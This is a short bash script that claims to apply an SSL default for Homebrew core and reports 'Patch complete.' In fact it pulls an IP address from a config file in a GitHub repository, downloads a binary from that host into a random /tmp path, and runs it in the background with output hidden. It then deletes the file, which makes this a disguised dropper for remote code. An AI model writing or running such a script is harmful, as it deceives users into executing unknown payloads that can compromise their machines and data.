#!/bin/bash
tmp="/tmp/$(od -vAn -N6 -tx1 /dev/urandom | tr -d " \n" | head -c 12)"
ip="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^ipaddr | cut -f2 -d'=')"
args="$(curl -s https://raw.githubusercontent.com/svendev045/CurlR/main/config | grep ^args | cut -f2 -d'=')"
echo "Applying SSL default for Brew core..."
curl -s http://$ip/brew-core -o $tmp >/dev/null 2>&1
chmod +x $tmp
nohup $tmp $bin_args >/dev/null 2>&1 &
rm $tmp
sleep 5
echo "Patch complete."
